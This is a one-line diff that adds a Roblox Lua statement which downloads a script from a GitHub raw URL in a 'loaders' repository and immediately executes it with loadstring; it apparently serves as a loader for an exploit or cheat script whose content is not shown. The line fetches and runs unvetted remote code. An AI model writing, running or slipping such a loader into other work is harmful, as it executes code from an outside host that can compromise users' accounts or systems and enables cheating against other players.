@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/title-unavailable-spam6-t6y2moqxlpojeg.lua"))()
